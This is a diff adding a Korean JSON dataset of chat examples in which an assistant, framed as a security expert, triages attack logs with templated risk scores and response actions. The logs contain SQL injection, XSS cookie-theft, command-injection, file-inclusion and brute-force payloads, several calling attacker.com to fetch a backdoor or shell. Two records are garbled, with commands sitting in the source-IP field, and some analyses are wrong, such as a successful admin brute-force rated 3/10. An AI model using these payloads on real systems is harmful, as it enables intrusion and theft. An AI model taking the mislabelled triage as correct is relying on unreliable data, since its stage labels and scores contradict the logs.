@@ -1,0 +1,162 @@
+[
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: SESSION_007\n출발지 IP: 192.168.1.106\n공격 시작 시간: 2025-12-12 11:15:01\n공격 종료 시간: 2025-12-12 11:15:23\n총 시도 횟수: 2\n성공한 공격: 2\n실패한 공격: 0\n공격 유형: SQL_INJECTION, XSS\n\n공격 타임라인:\n1. [2025-12-12 11:15:01] SQL_INJECTION 시도 (성공): ' OR '1'='1\n2. [2025-12-12 11:15:23] XSS 시도 (성공): <script>document.location='http://attacker.com/coo\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: DATA_EXFILTRATION\n**위험도 점수**: 10/10\n\n**권장 대응 조치**:\n\n1. [CRITICAL] IP 차단 (즉시)\n   - 조치: BLOCK_IP\n2. [CRITICAL] SOC 팀 즉시 알림\n   - 조치: ALERT_SOC\n3. [HIGH] WAF SQL Injection 규칙 활성화\n   - 조치: ENABLE_WAF_RULE\n\n**분석 요약**:\n이 공격은 DATA_EXFILTRATION 단계로 분류되며, 총 2회 시도 중 2회 성공하였습니다. 위험도는 10/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: SESSION_005\n출발지 IP: 192.168.1.104\n공격 시작 시간: 2025-12-12 11:00:01\n공격 종료 시간: 2025-12-12 11:00:13\n총 시도 횟수: 7\n성공한 공격: 1\n실패한 공격: 6\n공격 유형: BRUTE_FORCE\n\n공격 타임라인:\n1. [2025-12-12 11:00:01] BRUTE_FORCE 시도 (실패): admin:password\n2. [2025-12-12 11:00:03] BRUTE_FORCE 시도 (실패): admin:123456\n3. [2025-12-12 11:00:05] BRUTE_FORCE 시도 (실패): admin:admin\n4. [2025-12-12 11:00:07] BRUTE_FORCE 시도 (실패): admin:letmein\n5. [2025-12-12 11:00:09] BRUTE_FORCE 시도 (실패): admin:qwerty\n6. [2025-12-12 11:00:11] BRUTE_FORCE 시도 (실패): admin:password123\n7. [2025-12-12 11:00:13] BRUTE_FORCE 시도 (성공): admin:Password1!\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: DATA_EXFILTRATION\n**위험도 점수**: 3/10\n\n**권장 대응 조치**:\n\n1. [MEDIUM] 모니터링 강화\n   - 조치: LOG_MONITOR\n\n**분석 요약**:\n이 공격은 DATA_EXFILTRATION 단계로 분류되며, 총 7회 시도 중 1회 성공하였습니다. 위험도는 3/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: SESSION_003\n출발지 IP: 192.168.1.102\n공격 시작 시간: 2025-12-12 10:45:01\n공격 종료 시간: 2025-12-12 10:45:34\n총 시도 횟수: 2\n성공한 공격: 0\n실패한 공격: 2\n공격 유형: COMMAND_INJECTION\n\n공격 타임라인:\n1. [2025-12-12 10:45:01] COMMAND_INJECTION 시도 (실패): 127.0.0.1; ls\n2. [2025-12-12 10:45:34] COMMAND_INJECTION 시도 (실패): 127.0.0.1 && whoami\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: INITIAL_ACCESS\n**위험도 점수**: 5/10\n\n**권장 대응 조치**:\n\n1. [HIGH] IP 속도 제한\n   - 조치: RATE_LIMIT\n2. [HIGH] SOC 팀 알림\n   - 조치: ALERT_SOC\n\n**분석 요약**:\n이 공격은 INITIAL_ACCESS 단계로 분류되며, 총 2회 시도 중 0회 성공하였습니다. 위험도는 5/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: 192.168.1.106\n출발지 IP: wget http://attacker.com/backdoor.sh\n공격 시작 시간: 2025-12-12 11:15:56\n공격 종료 시간: 2025-12-12 11:16:34\n총 시도 횟수: 2\n성공한 공격: 2\n실패한 공격: 0\n공격 유형: COMMAND_INJECTION\n\n공격 타임라인:\n1. [2025-12-12 11:15:56] COMMAND_INJECTION 시도 (성공): 127.0.0.1\n2. [2025-12-12 11:16:34] COMMAND_INJECTION 시도 (성공): 127.0.0.1\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: INITIAL_ACCESS\n**위험도 점수**: 10/10\n\n**권장 대응 조치**:\n\n1. [CRITICAL] IP 차단 (즉시)\n   - 조치: BLOCK_IP\n2. [CRITICAL] SOC 팀 즉시 알림\n   - 조치: ALERT_SOC\n3. [CRITICAL] 서버 격리 검토\n   - 조치: ISOLATE_SERVER\n\n**분석 요약**:\n이 공격은 INITIAL_ACCESS 단계로 분류되며, 총 2회 시도 중 2회 성공하였습니다. 위험도는 10/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: SESSION_008\n출발지 IP: 192.168.1.107\n공격 시작 시간: 2025-12-12 11:20:01\n공격 종료 시간: 2025-12-12 11:20:45\n총 시도 횟수: 3\n성공한 공격: 3\n실패한 공격: 0\n공격 유형: SQL_INJECTION, FILE_INCLUSION\n\n공격 타임라인:\n1. [2025-12-12 11:20:01] SQL_INJECTION 시도 (성공): ' UNION SELECT @@version,NULL--\n2. [2025-12-12 11:20:23] SQL_INJECTION 시도 (성공): ' UNION SELECT user(),database()--\n3. [2025-12-12 11:20:45] FILE_INCLUSION 시도 (성공): /etc/passwd\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: RECONNAISSANCE\n**위험도 점수**: 10/10\n\n**권장 대응 조치**:\n\n1. [CRITICAL] IP 차단 (즉시)\n   - 조치: BLOCK_IP\n2. [CRITICAL] SOC 팀 즉시 알림\n   - 조치: ALERT_SOC\n3. [HIGH] WAF SQL Injection 규칙 활성화\n   - 조치: ENABLE_WAF_RULE\n\n**분석 요약**:\n이 공격은 RECONNAISSANCE 단계로 분류되며, 총 3회 시도 중 3회 성공하였습니다. 위험도는 10/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: SESSION_006\n출발지 IP: 192.168.1.105\n공격 시작 시간: 2025-12-12 11:10:01\n공격 종료 시간: 2025-12-12 11:10:34\n총 시도 횟수: 2\n성공한 공격: 1\n실패한 공격: 1\n공격 유형: CSRF\n\n공격 타임라인:\n1. [2025-12-12 11:10:01] CSRF 시도 (실패): <img src=http://dvwa/vulnerabilities/csrf/?passwor\n2. [2025-12-12 11:10:34] CSRF 시도 (성공): <form action=http://dvwa/vulnerabilities/csrf/> me\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: DATA_EXFILTRATION\n**위험도 점수**: 6/10\n\n**권장 대응 조치**:\n\n1. [HIGH] IP 속도 제한\n   - 조치: RATE_LIMIT\n2. [HIGH] SOC 팀 알림\n   - 조치: ALERT_SOC\n\n**분석 요약**:\n이 공격은 DATA_EXFILTRATION 단계로 분류되며, 총 2회 시도 중 1회 성공하였습니다. 위험도는 6/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: SESSION_009\n출발지 IP: 192.168.1.108\n공격 시작 시간: 2025-12-12 11:30:01\n공격 종료 시간: 2025-12-12 11:31:12\n총 시도 횟수: 3\n성공한 공격: 3\n실패한 공격: 0\n공격 유형: SQL_INJECTION\n\n공격 타임라인:\n1. [2025-12-12 11:30:01] SQL_INJECTION 시도 (성공): ' AND 1=2 UNION SELECT NULL,CONCAT(user,0x3a,passw\n2. [2025-12-12 11:30:34] SQL_INJECTION 시도 (성공): ' AND 1=2 UNION SELECT NULL,group_concat(table_nam\n3. [2025-12-12 11:31:12] SQL_INJECTION 시도 (성공): ' AND 1=2 UNION SELECT NULL,load_file('/etc/passwd\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: RECONNAISSANCE\n**위험도 점수**: 10/10\n\n**권장 대응 조치**:\n\n1. [CRITICAL] IP 차단 (즉시)\n   - 조치: BLOCK_IP\n2. [CRITICAL] SOC 팀 즉시 알림\n   - 조치: ALERT_SOC\n3. [HIGH] WAF SQL Injection 규칙 활성화\n   - 조치: ENABLE_WAF_RULE\n\n**분석 요약**:\n이 공격은 RECONNAISSANCE 단계로 분류되며, 총 3회 시도 중 3회 성공하였습니다. 위험도는 10/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: 192.168.1.102\n출발지 IP: cat /etc/passwd\n공격 시작 시간: 2025-12-12 10:46:12\n공격 종료 시간: 2025-12-12 10:46:45\n총 시도 횟수: 2\n성공한 공격: 2\n실패한 공격: 0\n공격 유형: COMMAND_INJECTION\n\n공격 타임라인:\n1. [2025-12-12 10:46:12] COMMAND_INJECTION 시도 (성공): 127.0.0.1\n2. [2025-12-12 10:46:45] COMMAND_INJECTION 시도 (성공): 127.0.0.1\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: INITIAL_ACCESS\n**위험도 점수**: 10/10\n\n**권장 대응 조치**:\n\n1. [CRITICAL] IP 차단 (즉시)\n   - 조치: BLOCK_IP\n2. [CRITICAL] SOC 팀 즉시 알림\n   - 조치: ALERT_SOC\n3. [CRITICAL] 서버 격리 검토\n   - 조치: ISOLATE_SERVER\n\n**분석 요약**:\n이 공격은 INITIAL_ACCESS 단계로 분류되며, 총 2회 시도 중 2회 성공하였습니다. 위험도는 10/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: SESSION_004\n출발지 IP: 192.168.1.103\n공격 시작 시간: 2025-12-12 10:50:15\n공격 종료 시간: 2025-12-12 10:52:01\n총 시도 횟수: 4\n성공한 공격: 2\n실패한 공격: 2\n공격 유형: FILE_INCLUSION\n\n공격 타임라인:\n1. [2025-12-12 10:50:15] FILE_INCLUSION 시도 (실패): ../../etc/passwd\n2. [2025-12-12 10:50:48] FILE_INCLUSION 시도 (실패): ../../../etc/shadow\n3. [2025-12-12 10:51:23] FILE_INCLUSION 시도 (성공): ....//....//....//etc/passwd\n4. [2025-12-12 10:52:01] FILE_INCLUSION 시도 (성공): http://attacker.com/shell.txt\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: EXPLOITATION\n**위험도 점수**: 8/10\n\n**권장 대응 조치**:\n\n1. [CRITICAL] IP 차단 (즉시)\n   - 조치: BLOCK_IP\n2. [CRITICAL] SOC 팀 즉시 알림\n   - 조치: ALERT_SOC\n\n**분석 요약**:\n이 공격은 EXPLOITATION 단계로 분류되며, 총 4회 시도 중 2회 성공하였습니다. 위험도는 8/10 입니다."
+      }
+    ]
+  },
+  {
+    "messages": [
+      {
+        "role": "system",
+        "content": "당신은 보안 전문가입니다. 공격 로그를 분석하고 적절한 대응 방안을 제시하는 역할을 수행합니다."
+      },
+      {
+        "role": "user",
+        "content": "다음은 보안 시스템에서 탐지된 공격 로그입니다. 이 공격을 분석하고 적절한 대응 방안을 제시하세요.\n\n세션 ID: SESSION_001\n출발지 IP: 192.168.1.100\n공격 시작 시간: 2025-12-12 10:35:12\n공격 종료 시간: 2025-12-12 10:39:15\n총 시도 횟수: 7\n성공한 공격: 5\n실패한 공격: 2\n공격 유형: SQL_INJECTION\n\n공격 타임라인:\n1. [2025-12-12 10:35:12] SQL_INJECTION 시도 (실패): ' OR '1'='1\n2. [2025-12-12 10:35:45] SQL_INJECTION 시도 (실패): admin' --\n3. [2025-12-12 10:36:23] SQL_INJECTION 시도 (성공): ' UNION SELECT NULL,NULL--\n4. [2025-12-12 10:37:01] SQL_INJECTION 시도 (성공): ' UNION SELECT user,password FROM users--\n5. [2025-12-12 10:37:34] SQL_INJECTION 시도 (성공): ' UNION SELECT database(),version()--\n6. [2025-12-12 10:38:12] SQL_INJECTION 시도 (성공): ' UNION SELECT table_name,NULL FROM information_sc\n7. [2025-12-12 10:39:15] SQL_INJECTION 시도 (성공): ' AND SLEEP(3)--\n"
+      },
+      {
+        "role": "assistant",
+        "content": "### 공격 분석 결과\n\n**공격 단계**: RECONNAISSANCE\n**위험도 점수**: 10/10\n\n**권장 대응 조치**:\n\n1. [CRITICAL] IP 차단 (즉시)\n   - 조치: BLOCK_IP\n2. [CRITICAL] SOC 팀 즉시 알림\n   - 조치: ALERT_SOC\n3. [HIGH] WAF SQL Injection 규칙 활성화\n   - 조치: ENABLE_WAF_RULE\n\n**분석 요약**:\n이 공격은 RECONNAISSANCE 단계로 분류되며, 총 7회 시도 중 5회 성공하였습니다. 위험도는 10/10 입니다."
+      }
+    ]
+  }
+]
